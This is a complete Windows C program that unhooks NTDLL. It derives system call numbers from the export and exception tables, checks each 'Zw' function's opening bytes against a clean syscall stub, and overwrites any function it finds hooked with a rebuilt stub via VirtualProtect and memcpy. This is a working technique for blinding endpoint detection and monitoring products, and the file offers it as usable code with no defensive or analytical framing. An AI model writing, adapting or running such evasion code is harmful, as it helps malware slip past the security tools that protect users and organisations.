#include <stdio.h>
#include <windows.h>


// afaik 
                                                         //--------SSN---------//
unsigned char stubTemplate[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

BOOL isHooked(PVOID fnAddr) {
    return memcmp(fnAddr, stubTemplate, 4);
}

void UnhookNTDLL() {
    uintptr_t ntdllBase = (uintptr_t)GetModuleHandleA("NTDLL");

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(ntdllBase);
    PIMAGE_NT_HEADERS ntHdrs = (PIMAGE_NT_HEADERS)(ntdllBase + dosHdr->e_lfanew);

    IMAGE_OPTIONAL_HEADER optHdr = ntHdrs->OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(ntdllBase + optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addrOfNames = (PDWORD)(ntdllBase + expDir->AddressOfNames);
    PWORD addrOfOrds = (PWORD)(ntdllBase + expDir->AddressOfNameOrdinals);
    PDWORD addrOfFuncs = (PDWORD)(ntdllBase + expDir->AddressOfFunctions);

    PIMAGE_RUNTIME_FUNCTION_ENTRY rtf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ntdllBase + optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);

    DWORD ssn = 0;
    DWORD index = 0;

    while (rtf[index].BeginAddress) {

        DWORD beginAddr = rtf[index].BeginAddress;

        for (int x = 0; x < expDir->NumberOfFunctions; x++) {

            LPCSTR fnName = (LPCSTR)(ntdllBase + addrOfNames[x]);
            WORD fnOrd = (WORD)(addrOfOrds[x]);
            DWORD fnRva = (DWORD)(addrOfFuncs[fnOrd]);

            PVOID fnAddr = (PVOID)(ntdllBase + fnRva);
            

            if (!strncmp(fnName, "Zw", 2) && fnRva == beginAddr) {

                if (isHooked(fnAddr) && strcmp(fnName, "ZwQuerySystemTime")) {

                    printf("[*] %s Is Hooked!\n", fnName);

                    memcpy(&stubTemplate[4], (void*)&ssn, sizeof(DWORD));

                    DWORD oldPro;
                    VirtualProtect(fnAddr, sizeof(stubTemplate), PAGE_EXECUTE_READWRITE, &oldPro);

                    memcpy(fnAddr, stubTemplate, sizeof(stubTemplate));

                    VirtualProtect(fnAddr, sizeof(stubTemplate), oldPro, &oldPro);

                }

                ssn++;
            }
        }

        index++;
    }
}

int main()
{
    UnhookNTDLL();
}
